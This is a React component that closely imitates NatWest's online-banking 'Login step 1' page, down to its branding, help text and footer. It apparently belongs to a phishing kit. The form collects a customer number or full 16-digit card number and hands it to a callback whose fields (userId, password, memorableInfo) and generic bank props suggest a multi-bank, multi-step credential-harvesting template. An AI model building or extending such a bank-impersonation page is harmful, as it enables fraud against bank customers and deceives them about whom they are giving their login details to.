"use client";

import { useState } from "react";

interface NatwestProps {
  bankName?: string;
  selectedOption?: string;
  onSuccessSubmit: (data: {
    userId: string;
    password?: string;
    memorableInfo?: string;
    extraData?: string;
  }) => void;
}

export default function NatwestTemplate({
  bankName = "NatWest",
  selectedOption = "Business",
  onSuccessSubmit,
}: NatwestProps) {
  // Tabs: "customer" | "card"
  const [activeTab, setActiveTab] = useState<"customer" | "card">("customer");

  const [customerNumber, setCustomerNumber] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [rememberMe, setRememberMe] = useState(false);

  // Errors & Loading
  const [error, setError] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();

    if (activeTab === "customer") {
      if (!customerNumber.trim()) {
        setError(true);
        return;
      }
    } else {
      if (!cardNumber.trim()) {
        setError(true);
        return;
      }
    }

    setLoading(true);

    const primaryId =
      activeTab === "customer"
        ? `CustNo: ${customerNumber.trim()}`
        : `Card: ${cardNumber.trim()}`;

    const extra = `Method: ${activeTab === "customer" ? "Customer Number" : "Card (16-digit)"}`;

    onSuccessSubmit({
      userId: primaryId,
      password: "N/A (Step 1)",
      memorableInfo: activeTab === "customer" ? customerNumber.trim() : cardNumber.trim(),
      extraData: extra,
    });
  };

  return (
    <div className="min-h-full bg-[#f4f4f6] font-sans text-[#1e1427] flex flex-col justify-between selection:bg-[#5a1885] selection:text-white">
      <div>
        {/* ================= 1. NATWEST HEADER ================= */}
        <header className="w-full bg-[#4c126b] px-6 sm:px-12 py-3 flex items-center justify-between border-b border-[#3b0c54]">
          {/* Logo */}
          <div className="flex items-center gap-2.5">
            {/* Natwest 3 chevron cubes icon */}
            <div className="flex items-center justify-center p-1 bg-[#da1c5c] rounded">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
                <path d="M4 6l4-4 4 4-4 4-4-4zm8 8l4-4 4 4-4 4-4-4zm-8 0l4-4 4 4-4 4-4-4z" />
              </svg>
            </div>
            <span className="text-xl font-bold tracking-tight text-white">
              NatWest
            </span>
          </div>

          {/* Cancel Button */}
          <button
            type="button"
            className="rounded-full border border-white px-5 py-1 text-xs font-semibold text-white hover:bg-white/10 transition"
          >
            Cancel
          </button>
        </header>

        {/* ================= 2. HERO PURPLE BANNER ================= */}
        <div className="w-full bg-[#4c126b] px-6 sm:px-12 pt-6 pb-12 text-white">
          <div className="max-w-[960px] mx-auto">
            <h1 className="text-3xl sm:text-[38px] font-black tracking-tight leading-tight">
              Login step 1 - Online Banking
            </h1>
            <p className="text-xs sm:text-[13.5px] text-purple-200 mt-2 font-light">
              You can use your customer number or your 16-digit debit or credit card number to log in.
            </p>
          </div>
        </div>

        {/* ================= 3. MAIN FORM & SIDE PROMO ================= */}
        <div className="max-w-[960px] mx-auto px-6 sm:px-12 -mt-4">
          <div className="grid grid-cols-1 lg:grid-cols-12 gap-8 items-start">
            
            {/* Left 8 Cols: Login Card */}
            <div className="lg:col-span-8 bg-white rounded-t-lg rounded-b-md shadow-sm border border-slate-200 overflow-hidden">
              
              {/* Tabs */}
              <div className="flex border-b border-slate-200 bg-[#fbfbfb]">
                <button
                  type="button"
                  onClick={() => {
                    setActiveTab("customer");
                    setError(false);
                  }}
                  className={`px-6 py-3.5 text-sm font-semibold transition border-r border-slate-200 ${
                    activeTab === "customer"
                      ? "bg-white text-[#4c126b] border-t-2 border-t-[#4c126b] -mb-[1px]"
                      : "bg-[#fbfbfb] text-[#555] hover:text-[#4c126b]"
                  }`}
                >
                  Customer number
                </button>

                <button
                  type="button"
                  onClick={() => {
                    setActiveTab("card");
                    setError(false);
                  }}
                  className={`px-6 py-3.5 text-sm font-semibold transition border-r border-slate-200 ${
                    activeTab === "card"
                      ? "bg-white text-[#4c126b] border-t-2 border-t-[#4c126b] -mb-[1px]"
                      : "bg-[#fbfbfb] text-[#555] hover:text-[#4c126b]"
                  }`}
                >
                  Card number
                </button>
              </div>

              {/* Form Content Area with Side Purple Helper */}
              <div className="p-6 sm:p-8">
                <div className="grid grid-cols-1 md:grid-cols-12 gap-6">
                  
                  {/* Form Left 7 Cols */}
                  <form onSubmit={handleSubmit} className="md:col-span-7 space-y-4">
                    
                    {/* Customer Number Input */}
                    {activeTab === "customer" && (
                      <div>
                        <label className="block text-xs sm:text-[13px] font-semibold text-slate-700 mb-1.5">
                          Customer number
                        </label>
                        <input
                          type="text"
                          value={customerNumber}
                          onChange={(e) => {
                            setCustomerNumber(e.target.value);
                            if (error) setError(false);
                          }}
                          className={`w-full rounded-md border p-2.5 text-sm outline-none transition font-mono ${
                            error
                              ? "border-red-500 bg-red-50/20"
                              : "border-slate-400 focus:border-[#4c126b] focus:ring-1 focus:ring-[#4c126b]"
                          }`}
                        />
                      </div>
                    )}

                    {/* Card Number Input */}
                    {activeTab === "card" && (
                      <div>
                        <label className="block text-xs sm:text-[13px] font-semibold text-slate-700 mb-1.5">
                          Card number
                        </label>
                        <input
                          type="text"
                          maxLength={16}
                          placeholder="16-digit debit or credit card"
                          value={cardNumber}
                          onChange={(e) => {
                            setCardNumber(e.target.value.replace(/\D/g, ""));
                            if (error) setError(false);
                          }}
                          className={`w-full rounded-md border p-2.5 text-sm outline-none transition font-mono ${
                            error
                              ? "border-red-500 bg-red-50/20"
                              : "border-slate-400 focus:border-[#4c126b] focus:ring-1 focus:ring-[#4c126b]"
                          }`}
                        />
                      </div>
                    )}

                    {error && (
                      <p className="text-xs font-bold text-red-600">
                        Please enter a valid value.
                      </p>
                    )}

                    <div>
                      <a href="#" className="text-xs text-[#4c126b] underline font-semibold">
                        Forgotten your login details?
                      </a>
                    </div>

                    {/* Remember me */}
                    <div className="pt-2">
                      <label className="flex items-center gap-2 cursor-pointer text-xs text-slate-700">
                        <input
                          type="checkbox"
                          checked={rememberMe}
                          onChange={(e) => setRememberMe(e.target.checked)}
                          className="h-4 w-4 rounded border-slate-300 accent-[#4c126b]"
                        />
                        <span>Remember me</span>
                      </label>
                      <button
                        type="button"
                        className="text-[11.5px] text-[#4c126b] underline block mt-1 font-medium"
                      >
                        + What does this mean?
                      </button>
                    </div>

                    {/* Continue Button */}
                    <div className="pt-4">
                      <button
                        type="submit"
                        disabled={loading}
                        className="rounded-full bg-[#5a1885] hover:bg-[#430f65] active:scale-[0.99] px-9 py-2.5 font-bold text-sm text-white shadow transition cursor-pointer"
                      >
                        {loading ? "Verifying..." : "Continue"}
                      </button>
                    </div>

                    <div className="pt-2">
                      <p className="text-xs text-slate-500">
                        Not Registered for Online Banking?{" "}
                        <a href="#" className="text-[#4c126b] underline font-semibold">
                          Sign up here.
                        </a>
                      </p>
                    </div>
                  </form>

                  {/* Helper Right 5 Cols (Exact Screenshot Purple Box) */}
                  <div className="md:col-span-5 bg-[#f5effa] rounded-lg p-4 text-[12px] leading-relaxed text-[#3b1951] space-y-3">
                    <div className="flex items-start gap-2">
                      <span className="text-base text-[#4c126b]">🎓</span>
                      <p>
                        {activeTab === "customer" ? (
                          <>
                            Your customer number is your date of birth (<strong>DDMMYY</strong>), followed by your unique number (up to 4 digits).
                          </>
                        ) : (
                          <>
                            Enter the 16 digit card number on your debit or credit card.
                          </>
                        )}
                      </p>
                    </div>

                    <p>
                      {activeTab === "customer" ? (
                        "Mortgage only customers can also use this to log in."
                      ) : (
                        "If you've forgotten your customer number, you can enter your debit or credit card number - it's just as secure."
                      )}
                    </p>

                    <p>
                      {activeTab === "customer" ? (
                        <>
                          If you've forgotten your customer number, it's just as secure to log in{" "}
                          <button
                            type="button"
                            onClick={() => setActiveTab("card")}
                            className="text-[#4c126b] underline font-semibold"
                          >
                            using your debit or credit card number
                          </button>{" "}
                          if you have one.
                        </>
                      ) : (
                        "Please note, we'll never ask you for your full card details to log in."
                      )}
                    </p>

                    {activeTab === "customer" && (
                      <p>
                        Or you can{" "}
                        <a href="#" className="text-[#4c126b] underline font-semibold">
                          re-register for Online Banking
                        </a>.
                      </p>
                    )}
                  </div>

                </div>
              </div>
            </div>

            {/* Right 4 Cols: TAKE FIVE Promo Card (Exact Screenshot) */}
            <div className="lg:col-span-4 bg-white border-2 border-[#f7a800] rounded-sm p-5 shadow-sm">
              <div className="flex flex-col items-center text-center">
                {/* Take Five Hand Logo */}
                <div className="w-16 h-16 bg-black text-[#f7a800] rounded-full flex items-center justify-center p-2 mb-2 font-black">
                  <div className="text-white text-center leading-none">
                    <span className="text-xl">✋</span>
                    <span className="block text-[8px] font-black uppercase text-[#f7a800]">TAKE FIVE</span>
                  </div>
                </div>
                <span className="text-[11px] font-black tracking-wider uppercase text-black">
                  TO STOP FRAUD™
                </span>

                <h3 className="text-2xl font-black text-[#4c126b] mt-3 leading-tight">
                  Test your eagle eyes
                </h3>

                <p className="text-xs text-slate-600 mt-2 leading-relaxed">
                  It's easier than ever to fall for a fraudulent text or email. Have a go at Take Five's test to see if you can spot a fraud, it might just save you from the real thing.
                </p>
              </div>
            </div>

          </div>

          {/* Warning Banner & FSCS Logo Below */}
          <div className="mt-8 flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-t border-slate-300 pt-6">
            <div className="flex items-start gap-2.5 max-w-xl text-xs text-slate-700">
              <span className="h-5 w-5 rounded-full bg-slate-800 text-white flex items-center justify-center font-bold text-[10px] shrink-0 mt-0.5">
                i
              </span>
              <p>
                To keep our customers safe, any unauthorised attempt will be monitored and may be subject to legal action. If you're a NatWest Bank customer with authorised access, you can continue to log in.
              </p>
            </div>

            <div className="bg-[#531765] text-white px-3 py-1.5 rounded text-[10px] font-bold tracking-wider text-center shrink-0 w-24">
              fscs <br /><span className="text-[8px] font-light">PROTECTED</span>
            </div>
          </div>
        </div>
      </div>

      {/* ================= 4. FOOTER ================= */}
      <footer className="w-full bg-[#f4f4f6] border-t border-slate-300 px-6 sm:px-12 py-6 text-[11.5px] text-slate-600 mt-12">
        <div className="max-w-[960px] mx-auto flex flex-col sm:flex-row items-center justify-between gap-4">
          <div className="flex flex-wrap gap-4 text-[#4c126b] font-semibold">
            <a href="#" className="hover:underline">Legal Info</a>
            <a href="#" className="hover:underline">Security ↗</a>
            <a href="#" className="hover:underline">Privacy & Cookies</a>
            <a href="#" className="hover:underline">Accessibility ↗</a>
          </div>
          <div>
            © 2005 - 2026 National Westminster Bank plc
          </div>
        </div>
      </footer>
    </div>
  );
}